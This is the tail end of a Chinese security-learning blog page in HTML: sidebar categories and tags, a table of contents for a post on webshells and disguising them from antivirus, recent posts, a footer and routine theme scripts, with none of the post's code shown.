+    
+      <a href="/categories/计算机网络/">
+        <div class="categories-list-item">
+          计算机网络
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/CentoS-7基础/">
+        <div class="categories-list-item">
+          CentoS-7基础
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/web安全/">
+        <div class="categories-list-item">
+          web安全
+          <span class="categories-list-item-badge">7</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Mysql数据库/">
+        <div class="categories-list-item">
+          Mysql数据库
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/php代码基础/">
+        <div class="categories-list-item">
+          php代码基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/windows-2008-R2/">
+        <div class="categories-list-item">
+          windows-2008-R2
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/文件上传漏洞/">
+        <div class="categories-list-item">
+          文件上传漏洞
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/文件包含漏洞/">
+        <div class="categories-list-item">
+          文件包含漏洞
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/渗透测试/">
+        <div class="categories-list-item">
+          渗透测试
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/代码审计/">
+        <div class="categories-list-item">
+          代码审计
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right: 2px;"></i>热门标签</div>
+  <div class="tags-list">
+    
+    <a href="/tags/SQL注入/" title="SQL注入"><div class="tags-list-item">SQL注入</div></a>
+    
+    <a href="/tags/Linux/" title="Linux"><div class="tags-list-item">Linux</div></a>
+    
+    <a href="/tags/计算机网络/" title="计算机网络"><div class="tags-list-item">计算机网络</div></a>
+    
+    <a href="/tags/php代码基础/" title="php代码基础"><div class="tags-list-item">php代码基础</div></a>
+    
+    <a href="/tags/web安全/" title="web安全"><div class="tags-list-item">web安全</div></a>
+    
+    <a href="/tags/代码审计/" title="代码审计"><div class="tags-list-item">代码审计</div></a>
+    
+    <a href="/tags/渗透测试/" title="渗透测试"><div class="tags-list-item">渗透测试</div></a>
+    
+    <a href="/tags/windows/" title="windows"><div class="tags-list-item">windows</div></a>
+    
+    <a href="/tags/webshell/" title="webshell"><div class="tags-list-item">webshell</div></a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+          <aside class="right-column">
+            <div class="sticky-widescreen">
+  
+  
+  <article class="card card-content toc-card">
+    <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9Awebshell%E4%BB%8B%E7%BB%8D"><span class="toc-text">一：webshell介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFwebshell%EF%BC%9F"><span class="toc-text">1.什么是webshell？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%86%E7%B1%BB"><span class="toc-text">2.分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%80%E5%8F%A5%E8%AF%9DWebShell%E7%9A%84%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-text">3.一句话WebShell的执行原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">4.常见的代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-PHP%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">1.PHP中常见的代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#eval-%E5%87%BD%E6%95%B0"><span class="toc-text">eval()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#assert-%E5%87%BD%E6%95%B0"><span class="toc-text">assert()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#preg-replace-%E5%87%BD%E6%95%B0"><span class="toc-text">preg_replace()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#create-function-%E5%87%BD%E6%95%B0"><span class="toc-text">create_function()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#array-map-%E5%87%BD%E6%95%B0"><span class="toc-text">array_map()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#array-filter-%E5%87%BD%E6%95%B0"><span class="toc-text">array_filter()函数</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-asp%E8%AF%AD%E8%A8%80%E7%9A%84WebShell"><span class="toc-text">2.asp语言的WebShell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Awebshell%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80"><span class="toc-text">二：webshell变形免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%98%E5%BD%A2%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="toc-text">1.变形的目的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%98%E5%BD%A2%E6%96%B9%E6%B3%95"><span class="toc-text">2.常见的变形方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-str-replace-%E5%87%BD%E6%95%B0"><span class="toc-text">1.str_replace()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-base64-decode-%E5%87%BD%E6%95%B0"><span class="toc-text">2.base64_decode()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E2%80%9D-%E2%80%9D%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-text">3.利用”.”操作符</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-%E6%9B%B4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%9D%A5%E6%BA%90"><span class="toc-text">4.更换数据来源</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-%E6%9B%BF%E4%BB%A3%E6%A0%87%E7%AD%BE"><span class="toc-text">5.替代标签</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%84%E5%90%88%E9%9A%90%E8%97%8F%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">6.字符串组合隐藏关键字</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7-%E4%BD%BF%E7%94%A8%E5%AF%B9%E8%B1%A1%EF%BC%8C%E7%B1%BB%EF%BC%8C%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80"><span class="toc-text">7.使用对象，类，内置函数实现免杀</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
+  </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right: 2px;"></i>最近文章</div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-23</div>
+        <a href="/2022/02/23/文件包含漏洞/"><div class="recent-posts-item-content">文件包含漏洞</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-23</div>
+        <a href="/2022/02/23/文件上传漏洞/"><div class="recent-posts-item-content">文件上传漏洞</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-17</div>
+        <a href="/2022/02/17/mysql数据外带/"><div class="recent-posts-item-content"></div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-17</div>
+        <a href="/2022/02/17/一：获取数据库网站密码/"><div class="recent-posts-item-content"></div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>Copyright ©
+          
+          2020 -
+          
+          2022
+        </span>
+        &nbsp;
+        <a href="/" class="footer-link">混口饭吃 </a>
+      </div>
+    </div>
+
+    
+    <div class="footer-dsc">
+      
+      Powered by
+      <a href="https://hexo.io/" class="footer-link" target="_blank" rel="nofollow noopener noreferrer">&nbsp;Hexo </a>
+      
+      
+      <span>&nbsp;|&nbsp;</span>
+      
+      
+      Theme -
+      <a href="https://github.com/theme-kaze" class="footer-link" target="_blank"
+        rel="nofollow noopener noreferrer">&nbsp;Kaze</a>
+      
+    </div>
+    
+    
+    
+    
+</footer>
+  <a role="button" id="scrollbutton" class="basebutton"  aria-label="回到顶部">
+  <i class="iconfont icon-arrowleft button-icon"></i>
+</a>
+<a role="button" id="menubutton" class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a role="button" id="popbutton" class="basebutton" aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a role="button" id="darkbutton" class="basebutton darkwidget" aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a role="button" id="searchbutton" class="basebutton searchwidget" aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a>
+
+  
+  
+  
+  <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img');
+    var i;
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a');
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'));
+      wrapper.setAttribute('aria-label', 'illustration');
+      wrapper.style.cssText = 'width: 100%; display: flex; justify-content: center;';
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt;
+      wrapper.dataset.nolink = true;
+      img[i].before(wrapper);
+      wrapper.append(img[i]);
+      var divWrap = document.createElement('div');
+      divWrap.classList.add('gallery');
+      wrapper.before(divWrap);
+      divWrap.append(wrapper);
+    }
+    baguetteBox.run('.gallery');
+  }
+</script>
+<script>loadScript("/js/lib/lightbox/baguetteBox.min.js", addImgLayout)</script>
+  
+  
+  
+<script src="/js/main.js"></script>
+
+  
+  
+  <script>
+    var addLazyload = function () {
+      var observer = lozad('.lozad', {
+        load: function (el) {
+          el.srcset = el.getAttribute('data-src');
+        },
+        loaded: function (el) {
+          el.classList.add('loaded');
+        }
+      });
+      observer.observe();
+    }
+  </script>
+  <script>loadScript("/js/lib/lozad.min.js", addLazyload)</script>
+  
+  
+</body>
+
+</html>
